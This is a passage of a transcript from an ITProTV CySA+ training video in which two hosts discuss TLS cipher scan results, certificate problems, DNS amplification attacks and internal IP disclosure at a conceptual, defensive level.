RSAs,\n\n273\n00:13:35.900 --> 00:13:38.730\nso we're getting a lot of good\ninformation about what's going on here.\n\n274\n00:13:40.090 --> 00:13:44.480\nWhat is cool is when we come down here,\nwe see SSL enum ciphers.\n\n275\n00:13:44.480 --> 00:13:46.870\nThis was the really meat and\npotatoes of what we're talking about here.\n\n276\n00:13:46.870 --> 00:13:53.025\nAnd it's telling me we're using TLS,\nwell we support TLS version 1.0,\n\n277\n00:13:53.025 --> 00:13:57.310\nTLS version 1.1, and TLS version 1.2.\n\n278\n00:13:57.310 --> 00:13:58.830\nWonderful, now very good.\n\n279\n00:13:58.830 --> 00:14:00.460\nThat means you'll notice I don't see\n\n280\n00:14:00.460 --> 00:14:01.800\nSSL here.\n&gt;&gt; Nope.\n\n281\n00:14:01.800 --> 00:14:04.020\n&gt;&gt; We do not support SSL.\n\n282\n00:14:04.020 --> 00:14:08.240\nSo you will get hey, we don't\nsupport that if you try to use SSL.\n\n283\n00:14:08.240 --> 00:14:09.780\n&gt;&gt; SSL is verboten.\n\n284\n00:14:09.780 --> 00:14:12.650\n&gt;&gt; Yes, verboten, bad, nein, no good.\n\n285\n00:14:12.650 --> 00:14:13.210\n&gt;&gt; [LAUGH]\n\n286\n00:14:13.210 --> 00:14:16.040\n&gt;&gt; And then it gives you a little bit of\n\n287\n00:14:16.040 --> 00:14:18.732\ninformation about\nthe ciphers that it uses.\n\n288\n00:14:18.732 --> 00:14:24.140\nTLS, ECDHE,\nI believe that's a Diffie Hellman thing.\n\n289\n00:14:24.140 --> 00:14:31.430\nRSA with AES 128, AES 256, and\nyou continue to see AES 128 and 256.\n\n290\n00:14:31.430 --> 00:14:34.530\nYou typically don't want\nto see any ciphers that\n\n291\n00:14:34.530 --> 00:14:36.560\nare less than 128-bits.\n&gt;&gt; Mm-hm.\n\n292\n00:14:36.560 --> 00:14:37.610\n&gt;&gt; Then you're just asking for\n\n293\n00:14:37.610 --> 00:14:39.449\nit at that point in time.\n\n294\n00:14:39.449 --> 00:14:43.560\nSo we like to see that,\nwe do see that throughout here.\n\n295\n00:14:43.560 --> 00:14:45.030\n128 and 256 going on for\n\n296\n00:14:45.030 --> 00:14:51.360\neach one of the different versions\nof TLS that we support in our site.\n\n297\n00:14:51.360 --> 00:14:53.010\nAnd now I'm able to discern that.\n\n298\n00:14:53.010 --> 00:14:54.257\nI'm able to follow that up, look and\n\n299\n00:14:54.257 --> 00:14:56.208\nsee if that's going to be\na vulnerability for my system.\n\n300\n00:14:56.208 --> 00:15:01.435\nSo be aware, you're using TLS or\nSSL, the difference between the two,\n\n301\n00:15:01.435 --> 00:15:06.680\nkind of how their operations, but\nmost importantly, the versioning.\n\n302\n00:15:07.900 --> 00:15:11.170\nWhat's the latest version of TLS?\n\n303\n00:15:11.170 --> 00:15:14.020\nI think the latest version\nout right now for TLS is 1.3.\n\n304\n00:15:14.020 --> 00:15:15.860\n&gt;&gt; We're right now in-\n\n305\n00:15:15.860 --> 00:15:16.650\n&gt;&gt; 2018.\n\n306\n00:15:16.650 --> 00:15:19.660\nWe're May 2018.\n&gt;&gt; Right.\n\n307\n00:15:19.660 --> 00:15:21.358\n&gt;&gt; So as of May 2018, I believe\n\n308\n00:15:21.358 --> 00:15:24.400\n&gt;&gt; That version 1.3 is the latest version\n\n309\n00:15:24.400 --> 00:15:25.222\nof TLS that's up.\n\n310\n00:15:25.222 --> 00:15:27.550\nYou'll notice we don't have that on ours.\n\n311\n00:15:27.550 --> 00:15:31.370\nThat shouldn't be a problem as\nI think that it's quite recent.\n\n312\n00:15:31.370 --> 00:15:33.330\nI don't know exactly how recent but\n\n313\n00:15:33.330 --> 00:15:37.960\nrelatively recent enough that you'll\nstill, version 1.2 should be still fine.\n\n314\n00:15:37.960 --> 00:15:41.370\nThey continually work on these things and\nmake them more robust.\n\n315\n00:15:41.370 --> 00:15:44.210\nFind flaws, fix them or\nrelease new versions.\n\n316\n00:15:44.210 --> 00:15:47.754\nAnd then eventually we will move to 1.3,\nat least support for 1.3.\n\n317\n00:15:47.754 --> 00:15:50.314\nAnd the only time you'd want to,\nor not the only time, but\n\n318\n00:15:50.314 --> 00:15:53.661\na good reason why you would wanna stop\nsupport is if you find out that They have\n\n319\n00:15:53.661 --> 00:15:56.144\nbecome insecure [INAUDIBLE].\n&gt;&gt; They've become exploited\n\n320\n00:15:56.144 --> 00:15:57.077\n&gt;&gt; Exactly, see,\n\n321\n00:15:57.077 --> 00:16:00.410\nZach, he's paying attention, I love it.\n&gt;&gt; Sometimes.\n\n322\n00:16:00.410 --> 00:16:02.242\n&gt;&gt; He's watching the show.\n\n323\n00:16:02.242 --> 00:16:06.130\nAll right,\nthat moves us on to certificate issues.\n\n324\n00:16:07.580 --> 00:16:10.470\nSo we saw in our Nmap search here,\n\n325\n00:16:10.470 --> 00:16:13.940\nwhen it looked at the certificate\nthat we have, our SSL cert.\n\n326\n00:16:13.940 --> 00:16:18.370\nWe had some interesting things\ngoing on here, common name,\n\n327\n00:16:18.370 --> 00:16:23.570\norganization name,\nthere's also basically the surname.\n\n328\n00:16:23.570 --> 00:16:29.410\nWhen you create a certificate,\nit'll ask you these naming conventions.\n\n329\n00:16:29.410 --> 00:16:31.640\nAnd then you create it and\ntypically they go hand in hand.\n\n330\n00:16:31.640 --> 00:16:35.680\nSo my cert name and my,\nI'm just making sure I'm on my place here,\n\n331\n00:16:35.680 --> 00:16:38.230\nand my server name should match.\n\n332\n00:16:38.230 --> 00:16:42.142\nThey should say, yes, this goes with this.\n\n333\n00:16:42.142 --> 00:16:45.360\nIf you see a mismatch,\nthat could be an instance of foul play.\n\n334\n00:16:45.360 --> 00:16:49.230\nI'm trying to spoof certificates,\nso that I can do things like,\n\n335\n00:16:49.230 --> 00:16:50.760\nman in the middle attacks.\n\n336\n00:16:50.760 --> 00:16:55.802\nSo I can go, send that information here,\nI'm that person, I want that information.\n\n337\n00:16:55.802 --> 00:17:00.616\nI'm going to [SOUND] come into\nthe middle of that conversation and go,\n\n338\n00:17:00.616 --> 00:17:02.111\nI'm them, go here.\n\n339\n00:17:02.111 --> 00:17:03.378\nSo if you see that,\n\n340\n00:17:03.378 --> 00:17:08.396\nthat mismatch could be a fake cert\nthat's trying to be passed off as legit.\n\n341\n00:17:08.396 --> 00:17:12.475\nCert expiration's another vulnerability,\n\n342\n00:17:12.475 --> 00:17:17.700\nat least in the way of if I allow\nmy certificate to expire Zach\n\n343\n00:17:17.700 --> 00:17:22.926\ncould then purchase, or\ncreate the certificate of the same\n\n344\n00:17:22.926 --> 00:17:27.962\nname because now my expiration is done,\nit's expired.\n\n345\n00:17:27.962 --> 00:17:33.824\nIt's now free to be reissued,\nit can be reissued.\n\n346\n00:17:33.824 --> 00:17:38.392\nIf he beats me to the punch,\nhe could fake that he's me.\n\n347\n00:17:38.392 --> 00:17:42.480\nAnd that's again, a bad, bad thing,\nyou don't want that, so,\n\n348\n00:17:42.480 --> 00:17:44.900\nmake sure that you renew these things.\n\n349\n00:17:44.900 --> 00:17:49.480\nMake sure you have email alerts, and\nwarnings, and reminders, to let you know\n\n350\n00:17:49.480 --> 00:17:55.820\nit is time to renew your certs for\nyour SSL, TLS encryption certificate.\n\n351\n00:17:57.810 --> 00:17:59.060\nLet's see, what else?\n\n352\n00:17:59.060 --> 00:18:04.860\nUnknown CAs, if you ever get that pop-up,\nyou go to a site and it says, warning,\n\n353\n00:18:05.920 --> 00:18:11.610\nwe're receiving a certificate\nfrom an unknown source.\n\n354\n00:18:11.610 --> 00:18:14.420\nI don't know this, what do you want to do?\n\n355\n00:18:14.420 --> 00:18:15.790\nOur suggestion is leave.\n\n356\n00:18:16.890 --> 00:18:20.650\nYou'll notice that most browsers tell you,\nour suggestion is don't go there.\n\n357\n00:18:21.870 --> 00:18:23.580\nAnd what do we do?\n\n358\n00:18:23.580 --> 00:18:26.235\nWell I wanna go there,\nthat's why I typed the thing in.\n\n359\n00:18:26.235 --> 00:18:27.830\n&gt;&gt; [LAUGH]\n\n360\n00:18:27.830 --> 00:18:29.140\n&gt;&gt; Now, there are times where you would\n\n361\n00:18:29.140 --> 00:18:31.040\nsay yes, add this as an exception.\n\n362\n00:18:31.040 --> 00:18:35.140\nThis would be when I've created\nthis certificate myself.\n\n363\n00:18:35.140 --> 00:18:38.200\nI have issued it to myself,\nit's called a self signed certificate.\n\n364\n00:18:39.220 --> 00:18:42.290\nI've done that, I know that it's\nlegit because I created it.\n\n365\n00:18:42.290 --> 00:18:47.390\nThat would be one of the reasons, if not\nthe only reason, to say yes to that.\n\n366\n00:18:47.390 --> 00:18:49.850\nAnother reason would be,\nI know the person that created it, and\n\n367\n00:18:49.850 --> 00:18:53.450\nI know that it is held securely.\n\n368\n00:18:53.450 --> 00:18:57.840\nSo maybe inside of my organization, it has\nbeen created by our IT infrastructure, and\n\n369\n00:18:57.840 --> 00:18:59.240\nyou need to install a certificate.\n\n370\n00:18:59.240 --> 00:19:00.710\nNow we would probably push that,\n\n371\n00:19:00.710 --> 00:19:04.490\nyou wouldn't have to necessarily\ninstall it yourself as an end user.\n\n372\n00:19:04.490 --> 00:19:08.910\nIT would push that out so\nthat it would be installed on everybody.\n\n373\n00:19:08.910 --> 00:19:11.860\nBut if it wasn't, you might see\nthat error, but just be aware,\n\n374\n00:19:11.860 --> 00:19:14.040\nthat error i there for a reason.\n\n375\n00:19:14.040 --> 00:19:15.879\nAnd if you go to a site, and\n\n376\n00:19:15.879 --> 00:19:20.672\nyou get a certificate issue problem\nthat it doesn't recognize it.\n\n377\n00:19:20.672 --> 00:19:25.635\nThere's a list of known CAs and\ncertificates that come from those CAs,\n\n378\n00:19:25.635 --> 00:19:30.820\nthat are built in to just about every\noperating system and web browser.\n\n379\n00:19:30.820 --> 00:19:33.385\nAnd they say, these are the ones I know.\n\n380\n00:19:33.385 --> 00:19:37.388\nIf it hits that list and doesn't find you,\nit's the guy at the door going, yeah,\n\n381\n00:19:37.388 --> 00:19:41.640\nyou're not on the list buddy, you're\nnot getting in, it's not gonna happen.\n\n382\n00:19:41.640 --> 00:19:44.930\nThere's a good reason for\nthat, because if I click yes,\n\n383\n00:19:44.930 --> 00:19:50.050\nI'm allowing whatever I'm trying to\naccess, to do whatever it wants to do.\n\n384\n00:19:50.050 --> 00:19:54.020\nI'm saying I trust what's on\nthe other side of this warning.\n\n385\n00:19:54.020 --> 00:19:58.820\nAnd maybe even I want to allow that as\nan exception, permanently, put that in.\n\n386\n00:19:58.820 --> 00:20:03.420\nSo just be wary about doing that, and\neducate yourself on where that certificate\n\n387\n00:20:03.420 --> 00:20:06.340\ncame from, before you say yes to that.\n&gt;&gt; Daniel, could you throw that in\n\n388\n00:20:06.340 --> 00:20:09.343\na sandbox and do some sleuthing on it?\n&gt;&gt; Totally, yes you can.\n\n389\n00:20:09.343 --> 00:20:14.596\nYou can say, let me jump into a safe\nenvironment and see what happens,\n\n390\n00:20:14.596 --> 00:20:19.150\nmaybe do some monitoring and\nsee if any malfeasance occurs.\n\n391\n00:20:19.150 --> 00:20:22.380\nIs it, well,\nwhy is this creating a TCP connection,\n\n392\n00:20:22.380 --> 00:20:24.690\nafter I've gone to its website?\n\n393\n00:20:24.690 --> 00:20:27.360\nAnd it looks like I'm trying\nto send me information.\n\n394\n00:20:27.360 --> 00:20:33.570\nLook at this, I'm sending data packets\nof 36 megabytes, or however large it is.\n\n395\n00:20:33.570 --> 00:20:34.362\nWhat is that?\n\n396\n00:20:34.362 --> 00:20:37.416\nThere's the file name right there,\nlet me go look, it's malware.com,\n\n397\n00:20:37.416 --> 00:20:37.990\nsweet.\n&gt;&gt; [LAUGH]\n\n398\n00:20:37.990 --> 00:20:39.490\n&gt;&gt; Drive by download.\n\n399\n00:20:39.490 --> 00:20:41.610\nSomething like that, it could happen.\n\n400\n00:20:41.610 --> 00:20:43.953\nGreat, great catch there from Zach.\n\n401\n00:20:43.953 --> 00:20:47.534\nIf you were unsure and you wanted to\ntest it, too, so you could be sure,\n\n402\n00:20:47.534 --> 00:20:51.510\nthrow that in your sandbox environment so\nthat you could see what's going on.\n\n403\n00:20:53.540 --> 00:20:56.070\nThat moves us to the last thing I have for\nthis show.\n\n404\n00:20:56.070 --> 00:20:57.920\nWe'll have more to come,\nthough, don't worry.\n\n405\n00:20:57.920 --> 00:21:00.710\nWe'll have a part three,\nthere's never ending vulnerabilities.\n\n406\n00:21:00.710 --> 00:21:02.720\nWe could probably make an entire\nseries on it, to be honest with you.\n\n407\n00:21:02.720 --> 00:21:05.310\n&gt;&gt; So we could look at DNS, perhaps?\n\n408\n00:21:05.310 --> 00:21:07.590\n&gt;&gt; Yes, we're gonna look at DNS.\n\n409\n00:21:07.590 --> 00:21:08.822\nZach, are you familiar with DNS yet?\n\n410\n00:21:08.822 --> 00:21:11.203\nHave you figured it out?\n&gt;&gt; Sure.\n\n411\n00:21:11.203 --> 00:21:11.816\n&gt;&gt; I love it.\n\n412\n00:21:11.816 --> 00:21:14.609\n[LAUGH]\n&gt;&gt; Yeah, man, I'm good to go but\n\n413\n00:21:14.609 --> 00:21:16.310\nlet's see if you know.\n&gt;&gt; But\n\n414\n00:21:16.310 --> 00:21:19.595\nlet's see if you got it.\n&gt;&gt; Yeah, okay, test me.\n\n415\n00:21:19.595 --> 00:21:20.410\n&gt;&gt; [LAUGH] Okay.\n\n416\n00:21:20.410 --> 00:21:20.935\n&gt;&gt; So DNS,\n\n417\n00:21:20.935 --> 00:21:23.590\nthis is our domain name service.\n&gt;&gt; Yes, I know that.\n\n418\n00:21:23.590 --> 00:21:24.650\n&gt;&gt; It is the ability for\n\n419\n00:21:24.650 --> 00:21:29.070\nus to translate domain\nnames to IP addresses.\n\n420\n00:21:29.070 --> 00:21:33.410\nSeems innocuous enough, but it does have\nits own attacks, its own vulnerabilities.\n\n421\n00:21:33.410 --> 00:21:37.240\nA lot of times, and this is with\ninside of our network infrastructure,\n\n422\n00:21:38.310 --> 00:21:40.590\nyou could be attacking that.\n\n423\n00:21:40.590 --> 00:21:45.750\nAnd the problem comes in with, DNS is so\n\n424\n00:21:45.750 --> 00:21:48.830\nubiquitously used,\nI want to allow DNS traffic.\n\n425\n00:21:49.990 --> 00:21:52.840\nSo people understand that, and\nthey go, how can I game the system?\n\n426\n00:21:52.840 --> 00:21:58.090\nHow can I exploit the fact\nthat everyone is using this?\n\n427\n00:21:58.090 --> 00:22:00.890\nAnd they started looking for\nvery clever ways,\n\n428\n00:22:00.890 --> 00:22:06.120\nwhich will split DNS to attack somebody.\n\n429\n00:22:06.120 --> 00:22:10.550\nAnd typically we see this at\nleast a lot of times, very much.\n\n430\n00:22:10.550 --> 00:22:12.765\nThese are popular attacks,\nlet's put it that way.\n\n431\n00:22:12.765 --> 00:22:15.560\nIt's called a DNS amplification attack.\n\n432\n00:22:15.560 --> 00:22:17.380\nAnd it's really cool,\nto be honest with you.\n\n433\n00:22:17.380 --> 00:22:20.590\nIt's really smart, I love it,\nit's one of those when you hear it you go,\n\n434\n00:22:20.590 --> 00:22:22.510\nwhy didn't I think of that?\n\n435\n00:22:22.510 --> 00:22:25.870\nWhy did that,\nI could have come up with that.\n\n436\n00:22:25.870 --> 00:22:30.490\nBecause it's so simple and\nyet so effective right.\n\n437\n00:22:30.490 --> 00:22:33.022\nIt's the e equals mc squared\nof denial of service attacks.\n\n438\n00:22:33.022 --> 00:22:36.023\nIt's just staring everybody in\nthe face and yet so simple, and\n\n439\n00:22:36.023 --> 00:22:37.390\neverybody can understand.\n\n440\n00:22:38.760 --> 00:22:42.560\nSo let me get our Nmap out of the way.\n\n441\n00:22:42.560 --> 00:22:45.460\nI got this lovely DNS amplification-\n&gt;&gt; So just out of curiousity,\n\n442\n00:22:45.460 --> 00:22:46.420\nwho did come up with it?\n\n443\n00:22:46.420 --> 00:22:48.510\nOr was it just-\n&gt;&gt; I have no idea who came up with it.\n\n444\n00:22:48.510 --> 00:22:49.930\n&gt;&gt; There you go, yeah, but\n\n445\n00:22:49.930 --> 00:22:51.200\nwhoever did, smart.\n\n446\n00:22:51.200 --> 00:22:51.730\n&gt;&gt; Smart guy.\n\n447\n00:22:51.730 --> 00:22:52.930\n&gt;&gt; Smart.\n&gt;&gt; He's so\n\n448\n00:22:52.930 --> 00:22:53.871\nsmart.\n&gt;&gt; Very\n\n449\n00:22:53.871 --> 00:22:54.792\nsmart.\n&gt;&gt; [LAUGH]\n\n450\n00:22:54.792 --> 00:22:56.908\n&gt;&gt; So let's take a look at this thing.\n\n451\n00:22:56.908 --> 00:23:00.730\nSo here's our attacker, and\nthese IP addresses are completely made up.\n\n452\n00:23:00.730 --> 00:23:04.350\nI'm sure that they actually resolve to\nsomething, but they're, for my intents and\n\n453\n00:23:04.350 --> 00:23:06.370\npurposes, are not real.\n\n454\n00:23:06.370 --> 00:23:08.338\nExcept for this one,\nthis is actually a real IP address.\n\n455\n00:23:08.338 --> 00:23:10.100\n[LAUGH] The 4.2.2.1.\n&gt;&gt; Don't forget about it after you see it.\n\n456\n00:23:10.100 --> 00:23:12.100\n&gt;&gt; Yeah, that is an actual DNS server\n\n457\n00:23:12.100 --> 00:23:13.780\nthat's out in the wild.\n\n458\n00:23:13.780 --> 00:23:16.351\nThat's a top level server of DNSt, right?\n\n459\n00:23:16.351 --> 00:23:17.618\nSo, here's what happens.\n\n460\n00:23:17.618 --> 00:23:22.069\nI have an attacker, the attacker\nsends queries to the DNS server,\n\n461\n00:23:22.069 --> 00:23:25.660\nhere's all my little queries,\nding ding ding ding.\n\n462\n00:23:26.990 --> 00:23:32.320\nThe DNS queries come but\nit spoofs the address from the source.\n\n463\n00:23:32.320 --> 00:23:36.501\nAnd the source of the little\npacket that goes out there.\n\n464\n00:23:36.501 --> 00:23:41.613\nSo it says, even though I'm 173.24.219.23,\n\n465\n00:23:41.613 --> 00:23:48.411\nwhen I send these queries, I want DNS, I\nwant you to tell me some DNS information.\n\n466\n00:23:48.411 --> 00:23:52.692\nBut I'm gonna pretend to be 224.90.21.188\n&gt;&gt; Shenanigans.\n\n467\n00:23:52.692 --> 00:23:54.448\n&gt;&gt; Who is my intended victim.\n\n468\n00:23:54.448 --> 00:24:00.719\nAll right, that I wanna DDoS,\nor DoS, as it were.\n\n469\n00:24:00.719 --> 00:24:06.526\nThe DNS Service says, cool,\nI've got a DNS query from 224.90.21.188.\n\n470\n00:24:06.526 --> 00:24:10.240\nI need to send them\nthe information they queried.\n\n471\n00:24:10.240 --> 00:24:15.193\nMan, they really wanna know about this,\ncuz they sent me a lot of it.\n\n472\n00:24:15.193 --> 00:24:18.400\nAnd they send it back, but you'll notice\nthe size of the data that's going by.\n\n473\n00:24:18.400 --> 00:24:23.280\nHere, I've tried to give some relativeness\nto what we're talking about here.\n\n474\n00:24:23.280 --> 00:24:28.287\nThe queries are very small, but\nthe data that gets sent back to\n\n475\n00:24:28.287 --> 00:24:33.986\nrespond to the queries is much larger\nthan what was asked for, right?\n\n476\n00:24:33.986 --> 00:24:36.180\nThis is why they call it\nan amplification attack.\n\n477\n00:24:37.750 --> 00:24:39.970\nThe packets that go back are much larger,\n\n478\n00:24:39.970 --> 00:24:44.890\ntherefore it's amplified,\nright, than what was sent.\n\n479\n00:24:44.890 --> 00:24:50.060\nSo now, if I send 2 million\nDNS queries to this server,\n\n480\n00:24:50.060 --> 00:24:53.060\nthis server thinks that it's meant for\nthis victim.\n\n481\n00:24:53.060 --> 00:24:56.604\nAnd it sends back 2 million\nto the tenth degree,\n\n482\n00:24:56.604 --> 00:25:01.626\nhowever much larger it is,\n[CROSSTALK] yeah, it's gonna hammer it.\n\n483\n00:25:01.626 --> 00:25:06.060\nAnd now, this victim is going, I'm\ntrying to process all these DNS queries.\n\n484\n00:25:06.060 --> 00:25:08.300\nWhy is this coming my way and\nit doesn't know what to do with it?\n\n485\n00:25:08.300 --> 00:25:11.614\nAnd it can shut down network,\nit can denial of service DNS,\n\n486\n00:25:11.614 --> 00:25:15.249\nit can do all sorts of crazy stuff.\n&gt;&gt; We've seen DNS attacks.\n\n487\n00:25:16.580 --> 00:25:17.730\n&gt;&gt; Yeah, exactly, so\n\n488\n00:25:17.730 --> 00:25:19.427\nthat's DNS amplification.\n\n489\n00:25:19.427 --> 00:25:24.638\nThe attacker sends a small set of\npackets out to the DNS server.\n\n490\n00:25:24.638 --> 00:25:26.818\nThe server responds to\nthe spoofed IP address,\n\n491\n00:25:26.818 --> 00:25:29.115\nwhich is the victim,\nwith a much larger payload.\n\n492\n00:25:29.115 --> 00:25:34.726\nAnd therefore hammering it so hard that\nit's unable to respond to anything else.\n\n493\n00:25:34.726 --> 00:25:39.010\nAnd it crashes, or\nit just has soaked up bandwidth.\n\n494\n00:25:39.010 --> 00:25:41.820\nRight, so\nthat is a DNS amplification attack.\n\n495\n00:25:41.820 --> 00:25:46.461\nSo make sure, also, with DNS,\nall the oldies but goldies,\n\n496\n00:25:46.461 --> 00:25:51.196\npatches, updates, buffer overflows,\ncoding execution.\n\n497\n00:25:51.196 --> 00:25:54.400\nThese are all things that you've gotta\nworry about, because it is software.\n\n498\n00:25:54.400 --> 00:25:57.105\nSo whatever version of\nDNS you are running,\n\n499\n00:25:57.105 --> 00:26:00.995\nif maybe someone's doing\nan internal amplification attack.\n\n500\n00:26:00.995 --> 00:26:06.558\nOr you have an external DNS server and\nit's being used for the attack.\n\n501\n00:26:06.558 --> 00:26:09.943\nYou wanna make sure, maybe someone's\njust targeting your DNS server and\n\n502\n00:26:09.943 --> 00:26:11.740\ntrying to gain access to it.\n\n503\n00:26:11.740 --> 00:26:13.490\nSo make sure it's up to\ndate on its patches,\n\n504\n00:26:13.490 --> 00:26:18.080\nmake sure it has a current\noperating system.\n\n505\n00:26:18.080 --> 00:26:20.850\nAnd that you're doing\na vulnerability assessment on it,\n\n506\n00:26:20.850 --> 00:26:24.900\nall the same things that we do on\nany other device on our network.\n\n507\n00:26:24.900 --> 00:26:30.166\nI think that's, we got one more thing,\ninternal IP disclosure.\n\n508\n00:26:30.166 --> 00:26:32.364\nIt was hiding at the bottom of my page.\n&gt;&gt; There it is.\n\n509\n00:26:32.364 --> 00:26:34.176\n&gt;&gt; It was trying to sneak away, no no no,\n\n510\n00:26:34.176 --> 00:26:36.230\nyou're gonna be in this episode.\n\n511\n00:26:36.230 --> 00:26:39.173\nInternal IP disclosure, so we don't\nneed this DNS amplification anymore,\n\n512\n00:26:39.173 --> 00:26:40.043\nwe can get rid of that.\n\n513\n00:26:40.043 --> 00:26:43.977\nWhat is internal IP disclosure?\n\n514\n00:26:43.977 --> 00:26:48.950\nWell, you've got the Internet,\nwhich is typically called external.\n\n515\n00:26:48.950 --> 00:26:51.990\nOr any network that's not\nthe one you're locally on,\n\n516\n00:26:51.990 --> 00:26:55.780\nthat's typically called\nyour internal network.\n\n517\n00:26:55.780 --> 00:26:59.756\nWe see this by the 192.168s,\nthe 172.16, or yeah,\n\n518\n00:26:59.756 --> 00:27:03.025\n172.16.32, usually something like that.\n\n519\n00:27:03.025 --> 00:27:06.984\nOr the 10.10 something networks\nthat we all have at our homes,\n\n520\n00:27:06.984 --> 00:27:09.490\nin our businesses, and things like that.\n\n521\n00:27:09.490 --> 00:27:12.634\nThose are private IP address ranges,\n\n522\n00:27:12.634 --> 00:27:17.165\nthey are not routable,\nthat's an internal network.\n\n523\n00:27:17.165 --> 00:27:21.900\nExternal networks are actual IPs that can\nroute, that can go across the Internet.\n\n524\n00:27:21.900 --> 00:27:25.835\nA router can look at that and go, I can\nsend this across disparate networks and\n\n525\n00:27:25.835 --> 00:27:28.187\nthey can make a connection,\nthat's external.\n\n526\n00:27:28.187 --> 00:27:30.337\nRight, what I don't wanna do is,\n\n527\n00:27:30.337 --> 00:27:34.207\nI don't wanna disclose IP\naddresses on my internal network.\n\n528\n00:27:34.207 --> 00:27:39.010\nBecause hackers can use that to map\nout the network, learn the topology,\n\n529\n00:27:39.010 --> 00:27:40.610\nthings of that nature.\n\n530\n00:27:40.610 --> 00:27:45.414\nKnow that there's an actual live machine,\nand that they can start focusing in on it.\n\n531\n00:27:45.414 --> 00:27:48.140\nWhat is that machine,\nwhy is that IP address?\n\n532\n00:27:48.140 --> 00:27:52.837\nThen we can see these, sometimes\nthese comes out, and a lot of times,\n\n533\n00:27:52.837 --> 00:27:54.681\nI see this in HTML headers.\n\n534\n00:27:54.681 --> 00:27:57.994\nSo if I'm doing something like\na Burp Suite thing, I'm intercepting or\n\n535\n00:27:57.994 --> 00:28:00.438\nI've got some sort of\nmonitoring software going on,\n\n536\n00:28:00.438 --> 00:28:02.580\nI'll be able to tap into\nthe network some way.\n\n537\n00:28:04.450 --> 00:28:08.978\nI'm querying things, and when the query\ncomes back, it's got internal IPs in it.\n\n538\n00:28:08.978 --> 00:28:13.630\nSo we wanna be looking for those things,\nand we can do this with our scans,\n\n539\n00:28:13.630 --> 00:28:16.220\njust looking at data as\nthey cross the network.\n\n540\n00:28:16.220 --> 00:28:19.906\nDoing our data analyzation and\nfiguring out if that's happening.\n\n541\n00:28:19.906 --> 00:28:25.394\nBut this can help attackers map\na network behind firewalls, even,\n\n542\n00:28:25.394 --> 00:28:30.960\nright, because I don't have to ask for\nin into the network.\n\n543\n00:28:30.960 --> 00:28:32.730\nAll I do is give me the resources,\n\n544\n00:28:32.730 --> 00:28:36.450\nsomething maybe in the DMZ,\nthat's typically why it's a web server.\n\n545\n00:28:36.450 --> 00:28:40.530\nSo it's sitting in the DMZ, it's got\naccess to both external internal networks,\n\n546\n00:28:40.530 --> 00:28:44.380\nand it gets confused on what IP address\nit should be telling you about, and\n\n547\n00:28:44.380 --> 00:28:45.370\ntherefore it comes back.\n\n548\n00:28:45.370 --> 00:28:48.975\nAnd if I'm looking at that information as\nit comes back, I'm perusing through it and\n\n549\n00:28:48.975 --> 00:28:50.540\nI find those internal IP addresses.\n\n550\n00:28:50.540 --> 00:28:53.966\nWell, then I know there are machines\nbehind there, and I know at\n\n551\n00:28:53.966 --> 00:28:58.225\nleast what their IP is, and I can start\nfocusing in on them, so be aware of that.\n\n552\n00:28:58.225 --> 00:29:02.508\nI think that's about all,\nif there's a configuration that maybe has\n\n553\n00:29:02.508 --> 00:29:06.958\nan internal IP in it, make sure to try\nto block that from external sight.\n\n554\n00:29:06.958 --> 00:29:10.440\nWe just wanna make sure\nno one can see that,\n\n555\n00:29:10.440 --> 00:29:12.160\nusing the various mechanisms\nof what you can do.\n\n556\n00:29:12.160 --> 00:29:16.266\nIt depends on where that's coming\nthrough on the technique you would\n\n557\n00:29:16.266 --> 00:29:17.549\nemploy to stop that.\n\n558\n00:29:17.549 --> 00:29:21.773\nSo I can't rattle off a list and\nhave you write them down, that's not here.\n\n559\n00:29:21.773 --> 00:29:25.372\nThis one, though, that internal IP\ndisclosure, is a vulnerability and\n\n560\n00:29:25.372 --> 00:29:29.564\nit's common and typically where you see\nit, which is through through HTTP headers.\n\n561\n00:29:29.564 --> 00:29:32.390\nZach, my man, my voice is going and\nour time is low, so\n\n562\n00:29:32.390 --> 00:29:34.675\nI think we've come to\na good stopping spot.\n\n563\n00:29:34.675 --> 00:29:37.944\nBut we will have a part three,\nso you gotta come back for that.\n\n564\n00:29:37.944 --> 00:29:41.736\nWe've got a lot of other cool attacks\nwe're gonna get into in part three,\n\n565\n00:29:41.736 --> 00:29:43.145\nnetwork appliances WiFi,\n\n566\n00:29:43.145 --> 00:29:46.167\ncool stuff like that.\n&gt;&gt; Common vulnerabilities, this has been\n\n567\n00:29:46.167 --> 00:29:49.377\npart two, there's a part one, and\nI guess there will be a part three.\n\n568\n00:29:49.377 --> 00:29:53.563\nSo make sure you see all three parts,\nDaniel's doing a great job.\n\n569\n00:29:53.563 --> 00:29:54.574\nAnything else before we move on?\n&gt;&gt; No,\n\n570\n00:29:54.574 --> 00:29:56.983\njust make sure that you're\nfamiliar with all these,\n\n571\n00:29:56.983 --> 00:30:00.262\nget those definitions down,\nflashcard material, always a great way.\n\n572\n00:30:00.262 --> 00:30:02.568\nRemember, repetition breeds retention,\n\n573\n00:30:02.568 --> 00:30:05.931\nso the more you go over this stuff\nif you're unfamiliar with it or\n\n574\n00:30:05.931 --> 00:30:10.127\nif there's anything you know that's like,\nyeah, I kind of understand that.\n\n575\n00:30:10.127 --> 00:30:12.360\nFind those spots and\ngo investigate more so\n\n576\n00:30:12.360 --> 00:30:16.019\nthat you're more solidly aware of\nwhat those techniques or tactics or\n\n577\n00:30:16.019 --> 00:30:18.871\nbest practices,\nwhatever it is that you're weak on,\n\n578\n00:30:18.871 --> 00:30:21.799\nget strong on before you take the exam.\n&gt;&gt; [FOREIGN]\n\n579\n00:30:21.799 --> 00:30:22.381\n&gt;&gt; [LAUGH]\n\n580\n00:30:22.381 --> 00:30:24.838\n&gt;&gt; And make sure you see every single\n\n581\n00:30:24.838 --> 00:30:26.360\nepisode of CySA+.\n\n582\n00:30:26.360 --> 00:30:29.130\nAnd again, Daniel's doing a great job\nputting together all kinds of information\n\n583\n00:30:29.130 --> 00:30:32.250\nfor you that you can use on those exams,\nthat you can use now and later.\n\n584\n00:30:32.250 --> 00:30:34.353\nAnd by the way,\nyou'll be in the course library,\n\n585\n00:30:34.353 --> 00:30:36.120\nthere's thousands of hours of content.\n\n586\n00:30:36.120 --> 00:30:39.130\nIt's there to help you go further,\nso check that out, too.\n\n587\n00:30:39.130 --> 00:30:43.050\nAnd tell everybody you know about ITProTV,\nITProTV is bingeworthy.\n\n588\n00:30:43.050 --> 00:30:45.190\nThanks for watching, I'm Zach Memos.\n&gt;&gt; And I'm Daniel Lowrie.\n\n589\n00:30:45.190 --> 00:30:46.490\n&gt;&gt; And we'll see you again soon.\n\n590\n00:30:46.490 --> 